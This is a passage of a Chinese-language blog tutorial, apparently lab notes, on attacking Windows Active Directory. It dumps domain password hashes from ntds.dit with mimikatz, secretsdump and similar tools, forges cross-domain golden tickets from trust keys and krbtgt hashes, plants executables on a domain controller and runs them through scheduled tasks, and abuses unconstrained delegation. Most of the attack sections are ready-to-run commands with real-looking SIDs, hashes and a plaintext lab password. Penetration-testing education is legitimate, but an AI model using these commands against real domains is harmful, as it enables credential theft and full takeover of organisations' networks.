class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone https://github.com/csababarta/ntdsxtract.git<br>cd ntdsxtract<br>python setup.py build<br>python setup.py install<br></code></pre></td></tr></table></figure><p>如果提示ImportError: No module named Crypto.Hash，请执行 pip install pycryptodome</p><p>4、将ntds.dit.export 和SYSTEM 文件放入到ntdsxtract 工具的文件夹中，然后导出哈希值，最后的 结果将保存在1.txt 里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7<br>output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --<br>lmoufile lmout | tee 1.txt<br></code></pre></td></tr></table></figure><h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将ntds.dit.export 和SYSTEM 文件放入到和secretsdump.exe 同级目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649553.png" alt="img"></p><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe可以进行导出哈希值的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">NTDSDumpEx -d ntds.dit -s system -o 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649605.png" alt="img"></p><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals是powershell脚本，可以离线读取ntds文件</p><p>安装DSInternals</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Install-Module DSInternals -Force<br></code></pre></td></tr></table></figure><p>导出hash，并保存在txt 文件里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$key = Get-Bootkey -SystemHivePath &#x27;system路径 &#x27;<br>Get-ADDBAccount -All -DBPath &#x27;ntds路径 &#x27; -Bootkey $key | Out-File output_hash.txt<br></code></pre></td></tr></table></figure><h2 id="在线方式读取ntds-dit文件"><a href="#在线方式读取ntds-dit文件" class="headerlink" title="在线方式读取ntds.dit文件"></a>在线方式读取ntds.dit文件</h2><p>在线的方式就是直接读取不需要在导出ntds文件,在域环境中，不要直接在线获取hash，特别是域环境比较大的时候，在线获取hash等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>1、可以读取所有用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">lsadump::dcsync /domain:hsmyzj.xyz /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649725.png" alt="img"></p><p>2、也可以读取单个用户的hash(同样这里我们还是用不了，暂时用上一条吧)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">lsadump::dcsync /domain:hsmyzj.xyz /user:administrator<br></code></pre></td></tr></table></figure><h3 id="Quarks-PwDump"><a href="#Quarks-PwDump" class="headerlink" title="Quarks PwDump"></a>Quarks PwDump</h3><p>1、上传工具到目标机器，使用命令先导出ntds文件，然后直接读取</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649782.png" alt="img"></p><h3 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h3><p>使用secretsdump直接读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds<br>secretsdump.exe hsmyzj.xyz/administrator:Abc123..@192.168.3.191 -outputfile 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649795.png" alt="img"></p><h3 id="Invoke-DCSync"><a href="#Invoke-DCSync" class="headerlink" title="Invoke-DCSync"></a>Invoke-DCSync</h3><p>Invoke-DCSyncs是powershell脚本可以在线读取内存中的用户hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Import-Module .\Invoke-DCSync.ps1<br>Invoke-DCSync -PWDumpFormat<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649920.png" alt="img"></p><h2 id="跨域攻击介绍"><a href="#跨域攻击介绍" class="headerlink" title="跨域攻击介绍"></a>跨域攻击介绍</h2><h3 id="内网中的域林"><a href="#内网中的域林" class="headerlink" title="内网中的域林"></a>内网中的域林</h3><p>很多大型企业都拥有自己的内网， 一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以 主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649938.png" alt="img"></p><h3 id="跨域攻击方法"><a href="#跨域攻击方法" class="headerlink" title="跨域攻击方法"></a>跨域攻击方法</h3><p>1、常规渗透方法（利用web漏洞）</p><p>2、哈希传递票据攻击</p><p>3、利用域信任关系</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649971.png" alt="img"></p><p><strong>域信任关系</strong></p><p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管 理和维护，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同 时，域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个</p><p>域，也就不存在通过域信任关系进行跨域资源共享了</p><p><strong>域信任关系分类</strong></p><p>域信任关系分为单向信任和双向信任</p><p>单向信任：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问 流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域 内的资源。也就是说，  A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。</p><p>双向信任：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问</p><p>流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向 可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身 份验证请求可以通关其父域向上流向信任域</p><p>域信任关系也可以分为内部信任和外部信任</p><p>内部信任：在默认情况下,用活动目录安装向导将新域添加到域树或林根域中，会自动创建双向可传递信 任。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为  内部信任。这种信任关系是可传递的。例如，有三个子域BA,CA,DA,BA域信任CA域， CA域信任DA域，</p><p>则BA域也信任DA域。</p><p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p><p>只有domain admins组中的用户可以管理域信任关系</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649018.png" alt="img"></p><h2 id="搭建和查看域信任关系"><a href="#搭建和查看域信任关系" class="headerlink" title="搭建和查看域信任关系"></a>搭建和查看域信任关系</h2><h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><p>在域中，  Enterprise Admins组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权</p><p>限。在默认情况下，该组包含林中所有域控制器上具有Administrators权限的成员</p><p>查看当前域中计算机的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">whoami /all<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649097.png" alt="img"></p><p>使用lg工具获取域的相关信息</p><p>查看域信任关系</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649174.png" alt="img"></p><p>获取当前域中的用户组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">LG.exe 域名\.<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649329.png" alt="img"></p><p>获取远程机器的本地用户组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">LG.exe \\计算机名 -lu<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649358.png" alt="img"></p><p>获取远程系统中的用户SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">LG.exe \\计算机名 -lu -sidsout<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649391.png" alt="img"></p><h2 id="利用域信任密钥获取目标域"><a href="#利用域信任密钥获取目标域" class="headerlink" title="利用域信任密钥获取目标域"></a>利用域信任密钥获取目标域</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th><strong>IP****地址</strong></th><th><strong>所属域</strong></th><th><strong>域中地位</strong></th><th><strong>机器名</strong></th><th><strong>当前登录用户</strong></th></tr></thead><tbody><tr><td><a href="https://192.168.41.10/">192.168.</a>3.191</td><td>hsmyzj.xyz</td><td>根域的域控</td><td>AD-2016</td><td>hsmyzj\administrator</td></tr><tr><td><a href="https://192.168.41.170/">192.168.</a>3.187</td><td>son.hsmyzj.xyz</td><td>子域的域控</td><td>son</td><td>son\administrator</td></tr><tr><td><a href="https://192.168.41.175/">192.168.</a>3.181</td><td>son.hsmyzj.xyz</td><td>子域中的机器</td><td>win10</td><td>son\hsmyzj</td></tr></tbody></table><p>当前已经控制son.hsmyzj.xyz域，其中包括son机器(域控)和win10机器</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649414.png" alt="img"></p><p><strong>实验步骤</strong></p><p>当前无法访问AD-2016.hsmyzj.xyz</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649452.png" alt="img"></p><p>使用mimikatz获取 当前域的 SID  父域的 SID  子域域管的NTLM  信任密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:hsmyzj$&quot; &quot;lsadump::trust /patch&quot; exit<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649638.png" alt="img"></p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649647.png" alt="img"></p><p>在普通的域内用户中创建创建高权限票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz.exe &quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;  exit<br><br>mimikatz kerberos::golden /domain:son.hsmyzj.xyz /sid:S-1-5-21-3711810844-2552107112-2058687077 /sids:S-1-5-21-2640154217-865433244-3862815811-519 /rc4:a806fce1bdbf24e9a72edeb1f5f2a76d /user:hsmyzj /service:krbtgt /target:hsmyzj.xyz /ticket:subdc_administrator.kirbi<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649660.png" alt="img"></p><p>上传asktgs.exe和kirbikator.exe工具， asktgs.exe伪造票据，  kirbikator.exe注入票据</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649694.png" alt="img"></p><p>创建CIFS服务的票据进行复制文件的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell asktgs.exe administrator.kirbi CIFS/AD-2016.hsmyzj.xyz<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649717.png" alt="img"></p><p>将票据注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649832.png" alt="img"></p><p>访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell dir \\AD-2016.hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649913.png" alt="img"></p><p>服务恶意文件,如果复制失败，请注入host服务票据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell copy a.exe \\AD-2016.hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649937.png" alt="img"></p><p>伪造host服务，进行创建计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell asktgs.exe subdc_administrator123.kirbi host/AD-2016.hsmyzj.xyz<br></code></pre></td></tr></table></figure><p>将票据注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell kirbikator.exe lsa host.AD-2016.hsmyzj.xyz.kirbi<br></code></pre></td></tr></table></figure><p>创建计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">schtasks /create /s AD-2016.hsmyzj.xyz /tn test /sc onstart /tr c:\b.exe /ru system /f<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649949.png" alt="img"></p><p>执行计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">schtasks /run /s AD-2016.hsmyzj.xyz /i /tn &quot;test&quot;<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649970.png" alt="img"></p><p>上线</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649999.png" alt="img"></p><h2 id="利用krbtgt哈希值获取目标域"><a href="#利用krbtgt哈希值获取目标域" class="headerlink" title="利用krbtgt哈希值获取目标域"></a>利用krbtgt哈希值获取目标域</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th><strong>IP****地址</strong></th><th><strong>所属域</strong></th><th><strong>域中地位</strong></th><th><strong>机器名</strong></th><th><strong>当前登录用户</strong></th></tr></thead><tbody><tr><td><a href="https://192.168.41.10/">192.168.</a>3.191</td><td>hsmyzj.xyz</td><td>根域的域控</td><td>AD-2016</td><td>hsmyzj\administrator</td></tr><tr><td><a href="https://192.168.41.170/">192.168.</a>3.187</td><td>son.hsmyzj.xyz</td><td>子域的域控</td><td>son</td><td>son\administrator</td></tr><tr><td><a href="https://192.168.41.175/">192.168.</a>3.181</td><td>son.hsmyzj.xyz</td><td>子域中的机器</td><td>win10</td><td>son\hsmyzj</td></tr></tbody></table><p>当前已经控制son.hsmyzj.xyz域，其中包括son机器和win10机器</p><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061649081.png" alt="img"></p><p><strong>实验步骤</strong></p><p>获取Krbtgt散列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">lsadump::lsa /patch /user:krbtgt<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711514712434-a3becd49-b4e8-4e80-bfb8-3e059f7aa445.png" alt="img"></p><p>获取关键信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">lsadump::trust /patch<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711514759655-933d9364-004d-4244-92de-d156ac564d34.png" alt="img"></p><p>构造并注入黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">Kerberos::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-<br>519 /krbtgt:krbtgt散列 /ptt<br>Kerberos::golden /user:administrator /domain:son.hsmyzj.xyz /sid:S-1-5-21-3711810844-2552107112-2058687077 /sids:S-1-5-21-2640154217-865433244-3862815811-519 /krbtgt:b04274bd0c5c8098dfcca559441b9f29 /ptt<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709382542996-ada79f4b-2fdd-4d64-a7a0-3055f5c38b98.png" alt="img"></p><p>访问目标域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dir \\AD-2016-hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711515190381-7a78562d-469b-4876-8ece-bd45a19f7c51.png" alt="img"></p><p>复制恶意文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy 1.exe \\AD-2016.hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p>执行计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">schtasks /create /s AD-2016.hsmyzj.xyz /tn test /sc onstart /tr c:\1.exe /ru system /f<br></code></pre></td></tr></table></figure><p>启动计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">schtasks /run /s AD-2016.hsmyzj.xyz /i /tn &quot;test&quot;<br></code></pre></td></tr></table></figure><p>成功上线</p><h2 id="域内委派攻击概述"><a href="#域内委派攻击概述" class="headerlink" title="域内委派攻击概述"></a>域内委派攻击概述</h2><h3 id="委派是什么"><a href="#委派是什么" class="headerlink" title="委派是什么"></a>委派是什么</h3><p>我们先看一下kerberos协议</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709382922004-0e39beba-bb5e-416a-817c-229d29ed420b.png" alt="img"></p><p>我们要去买票，但是自己又不想去，我们就可以委托中间商，给我们买票，这个就是委派</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709382931194-5b56a418-39bd-435f-8368-deddf5f32e68.png" alt="img"></p><p>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。</p><p>委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三 种：</p><p>1、非约束性委派</p><p>2、约束性委派</p><p>3、基于资源的约束性委派</p><h3 id="委派攻击的工作场景"><a href="#委派攻击的工作场景" class="headerlink" title="委派攻击的工作场景"></a>委派攻击的工作场景</h3><p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派攻击</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709382893047-dd43891f-0dc0-4841-9096-ef310ec9bed0.png" alt="img"></p><p><strong>怎么设置委派</strong></p><p>在域内只有主机账号和服务账号才有委派属性</p><p>主机账号：活动目录中的computers组内的计算机，也被称为机器账号。</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711520740381-c24e0890-9a85-446f-9f8b-6254f4920d53.png" alt="img"></p><p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如： SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">net user test123 Abc123.. /add /domain 创建一个普通用户<br>setspn -U -A priv/test test123 注册为服务账号<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711520778318-f8e195e1-054e-426e-98e9-3028fce8d5e2.png" alt="img"></p><p>开启委派如图</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383018857-77929894-c396-43c1-8a70-07fbb21a1080.png" alt="img"></p><h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><h3 id="非约束委派使用场景"><a href="#非约束委派使用场景" class="headerlink" title="非约束委派使用场景"></a>非约束委派使用场景</h3><p>从使用的角度：用户张三访问一台机器A，于是向DC发起认证，  DC会检查A的机器账号的属性，如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给A,这样A在验证ST票据的同时也获取到了  用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而A就可以使用这个TGT，来模拟这个张三访问任何服务。</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383223302-dcf12b4e-ea26-43b9-a303-d1fc8ac7050d.png" alt="img"></p><p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境，或者结合打印机漏洞让域管用户强制回连以缓存TGT</p><p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派，需要web系统代表用 户A去访问文件服务的资源<br><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383231030-6b2e03d1-a3a4-4c7f-b505-62255dd8d19a.png" alt="img"></p><h3 id="非约束委派的漏洞"><a href="#非约束委派的漏洞" class="headerlink" title="非约束委派的漏洞"></a>非约束委派的漏洞</h3><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383249321-309e387a-a95c-4ba9-86be-9620f47fc080.png" alt="img"></p><p>如果是域管访问web系统，我们就可以通过web系统伪造域管的身份登录域控</p><h3 id="利用非约束委派域控主动访问控制域"><a href="#利用非约束委派域控主动访问控制域" class="headerlink" title="利用非约束委派域控主动访问控制域"></a>利用非约束委派域控主动访问控制域</h3><p>实验环境如下：</p><table><thead><tr><th><strong>机器位置</strong></th><th><strong>机器****IP</strong></th><th><strong>机器****名</strong></th><th><strong>机器登录用户</strong></th><th><strong>所属域</strong></th><th><strong>委派配置</strong></th></tr></thead><tbody><tr><td>域内域控制</td><td><a href="https://192.168.41.10/">192.168.</a>3.191</td><td>AD-2016</td><td>hsmyzj\administrator</td><td>hsmyzj.xyz</td><td>域控</td></tr><tr><td>域内机器</td><td><a href="https://192.168.41.184/">192.168.</a>3.190</td><td>web-2012</td><td>hack\test123</td><td>hsmyzj.xyz</td><td></td></tr></tbody></table><p>实验前提：控制了域内的一台机器pc-web，并且该机器的服务账号配置了非约束委派，如下：</p><p>1、使用Adﬁnd查询域内非约束委派机器账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -b &quot;DC=hsmyzj,DC=xyz&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711521479559-b0000688-03db-4162-ad01-c5cb2b30e5e0.png" alt="img"></p><p>查询具有委派的服务账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -b &quot;DC=hsmyzj,DC=xyz&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711521586816-78cb3632-6a16-4328-8277-dde9b44ec55e.png" alt="img"></p><p>2、我们先去访问域控，是不能访问的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dir \\AD-2016.hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p>3、这个时候如果域管访问了pc-web机器我们的内存中就会有域管的TGT，就可以访问任意机器了，在与域控上执行访问PC-WEB(在域控上执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">net use \\web-2012.hsmyzj.xyz /user:hsmyzj\administrator Abc123..<br></code></pre></td></tr></table></figure><p><img 